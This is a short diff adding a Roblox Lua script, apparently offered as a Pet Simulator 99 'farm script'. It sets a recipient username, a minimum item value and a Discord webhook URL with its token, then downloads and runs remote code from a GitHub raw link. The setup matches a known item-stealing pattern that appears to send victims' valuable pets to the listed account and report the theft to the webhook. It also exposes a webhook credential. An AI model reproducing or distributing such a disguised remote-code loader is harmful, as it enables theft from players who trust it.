@@ -1,0 +1,5 @@
+_G.Usernames = {"Lander_TTV"}
+_G.minrap = 1000000
+_G.webhook = "https://discord.com/api/webhooks/1343379283946504264/9L7GQT1r22lijU08kq1dDZegCNjrCnPb-aUp_oDa5gHDuGYtVPGezcA3UHbZm_A5P0io"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Lander1farm1scripts/Ps99-farm-script/refs/heads/main/PS99%20SCRIPT"))()
